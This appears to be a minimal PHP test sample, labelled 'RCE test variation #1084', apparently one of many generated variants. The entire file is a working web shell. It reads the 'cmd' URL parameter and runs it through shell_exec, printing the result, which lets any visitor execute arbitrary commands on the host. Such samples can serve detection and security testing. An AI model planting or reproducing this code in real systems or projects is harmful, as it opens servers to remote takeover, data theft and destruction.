<?php
// RCE test variation #1084
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>